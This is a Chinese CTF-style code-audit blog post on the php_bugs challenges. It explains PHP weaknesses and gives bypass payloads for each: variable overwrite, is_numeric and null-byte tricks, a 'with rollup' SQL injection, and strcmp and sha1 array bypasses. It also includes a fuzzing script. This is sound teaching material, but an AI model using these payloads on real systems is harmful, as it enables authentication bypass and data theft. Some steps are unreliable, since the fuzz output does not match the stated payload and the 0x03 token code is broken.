---
title: "php_bugs 代码审计"
slug: php-bugs-code-audit
aliases: ["/2020/php-bugs-code-audit.html"]
date: 2020-03-12 12:50:05
categories: ["代码审计"]
tags: ["代码审计", "PHP"] 
toc: true
draft: false
---

简单的 php_bugs 代码审计，所有代码均来自：<https://github.com/bowu678/php_bugs>

## 0x01 extract 变量覆盖

```php
<?php
show_source(__FILE__);
$flag='xxx';
extract($_GET);
if(isset($shiyan)) {
    $content=trim(file_get_contents($flag));
    if($shiyan==$content) {
        echo 'ctf{xxx}';
    } else {
        echo 'Oh.no';
    }
}
?>
```

当 `$shiyan==$content` 时输出 `flag` ， `$flag` 赋给 `$content` ，这里不知道 `$flag` 的值，所以可以 `get` 一个 `flag` 变量覆盖 `$flag` ，当 `get` 的 `flag` 等于 `get` 的 `shiyan` 时即可输出 `flag` 。
构造 `payload` :
 `?shiyan=&flag=`

## 0x02 绕过过滤的空白字符

代码挺长的，就不放了，自行在 `github` 原项目上看。
主要满足四个点：

```php
is_numeric($_REQUEST['number']) == false
$req['number'] == strval(intval($req['number']
intval($req["number"]) == intval(strrev($req["number"])
is_palindrome_number($req["number"]) == false
```

即可输出 `flag` ，构造如下：

* 第一点`is_numeric()`判断变量是否为`数字`或`数字字符串`，可以检查`10 进制`或`16 进制`， `is_numeric()`可以用空字符绕过，`%00`放在数值`前、后`都可以判断为非数值，而`%20`空字符只能放在数值后。
* 第三点该`整数值`等于其`反转整数值`，第四点不为`回文数`，这两者看似矛盾，实则有多种绕过方法。

**法一**

来自[php_bugs](https://github.com/bowu678/php_bugs)，先满足 `第三点` 回文数再 `Fuzzing` 绕过 `第四点` ，简化后端代码：

```php
<?php
function is_palindrome_number($number) {
    $number = strval($number); //strval — 获取变量的字符串值
    $i = 0;
    $j = strlen($number) - 1; //strlen — 获取字符串长度
    while($i < $j) {
        if($number[$i] !== $number[$j]) {
            return false;
        }
        $i++;
        $j--;
    }
    return true;
}
$a = trim($_GET['number']);
var_dump(($a==strval(intval($a)))&(intval($a)==intval(strrev($a)))&!is_palindrome_number($a))
?>
```

将 `数值` 转成 `2位 16 进制` 加在 `回文数`  `191` 前面， `Fuzzing` 如下：

```python
import requests
for i in range(256):
    r = requests.get(url="http://arch/php_bugs/02.php?number={}191".format("%%%02X"%i))
    if '1' in r.text:
        print("%%%02X"%i)
```

输出结果如下：

 `%0C`

 `%2B`

即可构成 `payload` ：
 `?number=%00%2C191`

**法二**

仅限于 `32 位操作系统` ，利用 `intval()` 函数的溢出， `Intval()` 最大的值取决于 `操作系统` 。 `32 位系统` 最大带符号的 `integer` 范围是 `-2147483648` 到 `2147483647` 。举例，在这样的系统上， `intval('1000000000000')` 会返回 `2147483647` 。 `64 位系统` 上，最大带符号的 `integer` 值是 `9223372036854775807` 。

如果在 `32 位操作系统` 上我们可以构造 `payload` ： `?number=%002147483647`

`2147483647` 经过 `strrev()` 反转函数后为 `7463847412` ，又经过 `intval` 函数值又变为 `2147483647` ，故满足 `第三点` 条件，可以输出 `flag` 。

`64 位操作系统` 最大 `integer` 值是 `9223372036854775807` ，经 `strrev()` 反转函数后为 `7085774586302733229` 反而变小了，未满足溢出条件，故不适用。

**法三**

因为要求不能为回文数，但又要满足 `intval($req["number"])=intval(strrev($req["number"]))` 所以我们采用科学计数法构造 `payload` 为 `?number=0e-0%00` ，这样的话我们就可以绕过。

<font color=red>参考：</font>

[is_numeric()](https://www.cnblogs.com/GH-D/p/8085676.html)
[%%%02x](http://blog.sina.com.cn/s/blog_90a0ad8d01014f03.html)
[法二、三来源](https://blog.csdn.net/qq_44105778/article/details/88955564)

## 0x03 多重加密

`源码` 中给出：

```php
$login = unserialize(gzuncompress(base64_decode($requset['token'])));
//gzuncompress:进行字符串压缩
//unserialize: 将已序列化的字符串还原回 PHP 的值

if($login['user'] === 'ichunqiu'){echo $flag;}
```

有了 `加密` 方式，我们 `解密` 一下即可

```php
<?php
$arr = array(['user'] === 'ichunqiu');
$token = base64_encode(gzcompress(serialize($arr)));
echo $token;
?>
```

 `eJxLtDK0qs60MrBOAuJaAB5uBBQ=`

## 0x04 SQL 注入\_WITH ROLLUP 绕过

这个题来自实验吧 `因缺思汀的绕过`

```php
$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";
// 过滤的字符
$sql="SELECT * FROM interest WHERE uname = '{$_POST['uname']}'";
// 执行的 sql 语句
mysql_num_rows($query) == 1
// 返回结果集中行的数目
$key['pwd'] == $_POST['pwd']
// 提交的密码与数据库中的密码相等输出 flag
```

`$_POST` 输入通过定义的 `AttackFilter()` 函数过滤导致不能使用常规 `sql 注入` ，这里的思路是 `select` 过程中用 `group by with rollup` 方法进行插入查询。

先来看看 `group by with rollup` 统计方法有什么作用

```sql
MariaDB [test]> select * from test;
+-------+--------+
| user  | pwd    |
+-------+--------+
| admin | mypass |
+-------+--------+
1 row in set (0.010 sec)

MariaDB [test]> select * from test group by pwd with rollup;
+-------+--------+
| user  | pwd    |
+-------+--------+
| admin | mypass |
| admin | NULL   |
+-------+--------+
2 rows in set (0.001 sec)

MariaDB [test]> select * from test group by pwd with rollup limit 1;
+-------+--------+
| user  | pwd    |
+-------+--------+
| admin | mypass |
+-------+--------+
1 row in set (0.001 sec)

MariaDB [test]> select * from test group by pwd with rollup limit 1 offset 0;
+-------+--------+
| user  | pwd    |
+-------+--------+
| admin | mypass |
+-------+--------+
1 row in set (0.001 sec)

MariaDB [test]> select * from test group by pwd with rollup limit 1 offset 1;
+-------+-----+
| user  | pwd |
+-------+-----+
| admin | NULL |
+-------+-----+
1 row in set (0.001 sec)
```

`limit 1` 是指只查询 `一行` ， `offset 1` 指查询某一行的内容，不同的数字出现的是不同行的内容

当用 `with rollup` 方法的时候，会在数据库的最后一行生成一个 `密码` 为 `NULL` 的字段，在查询的时候就可以想想办法让 `pwd` 为空，而 `user` 也是存在的，又有 `mysql_num_rows($query) == 1` ，所以可以构造 `payload` ：

 `admin' or 1=1 group by pwd with rollup limit 1 offset x #`

查询语句就是：

 `SELECT * FROM interest WHERE uname = 'admin' or 1=1 group by pwd with rollup limit 1 offset x #'`

然后一个个试就行了。

<font color=red>参考:</font>

[实验吧 因缺思汀的绕过 By Assassin（with rollup 统计）](https://blog.csdn.net/qq_35078631/article/details/54772798)

## 0x05 ereg 正则%00 截断

直接看关键点审计

```php
ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE
// 要求 GET 密码只能是大小写字母和数字
strlen($_GET['password']) < 8 && $_GET['password'] > 9999999
// 要求 GET 密码长度小于 8 并且值要大于 9999999
strpos ($_GET['password'], '*-*') !== FALSE
// strpos()：查找字符串首次出现的位置
```

`第二点` 可以利用 `科学计数法` 的方式表示。

`第三点`  `GET 密码` 中要包括 `*-*` ，但是前面的 `ereg()` 过滤了特殊字符，这时候可以用 `%00` 截断， `ereg()` 读到 `%00` 的时候就截止了，所以构造 `payload` ：

 `1e9%00*-*`

## 0x06 strcmp 比较字符串

```php
<?php
show_source(__FILE__);
$flag = "flag";
if (isset($_GET['a'])) {
    if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。
    //比较两个字符串（区分大小写）
        die('Flag: '.$flag);
    else
        print 'No';
}
?>
```

`strcmp()` 期望传入类型是字符串类型，在 `5.3` 之前的 `php` 版本中若传入其他类型将会报错并返回 `0` ， `5.3` 之后报错不返回任何值，但如果传入 `数组` 的话，就会返回 `NULL` ，这里的判断是 `弱等于` ， `NULL==0` 是 `bool(true)` ，所以有构造 `payload` ：

 `?a[]=1`

## 0x07 sha() 函数比较绕过

```php
<?php
show_source(__FILE__);
$flag = "flag";
if (isset($_GET['name']) and isset($_GET['password'])) {
    if ($_GET['name'] == $_GET['password'])
        echo '<p>Your password can not be your name!</p>';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
        die('Flag: '.$flag);
    else
        echo '<p>Invalid password.</p>';
} else
    echo '<p>Login first!</p>';
?>
```

`$_GET['name'] ！= $_GET['password']` 同时满足 `sha1($_GET['name']) === sha1($_GET['password']`

`sha1()` 默认的传入类型是 `字符串` 类型，若传入 `数组` 会返回 `false` ，这里的判断是 `强等` ，需要构造 `username` 和 `password` 既不相等，又同样要是 `数组类型` ，构造 payload：

 `?name[]=a&password[]=b`

## 0x08 SESSION 验证绕过

```php
<?php
show_source(__FILE__);
$flag = "flag";

session_start();
if (isset ($_GET['password'])) {
    if ($_GET['password'] == $_SESSION['password'])
        die ('Flag: '.$flag);
    else
        print '<p>Wrong guess.</p>';
}
mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
?>
```

重点在于 `$_GET['password'] == $_SESSION['password']` ，这就很简单了，只需要 `GET` 值与 `SESSION` 相等，

构造 `payload` ：

 `?password=`

然后将 `cookies` 清空即可。
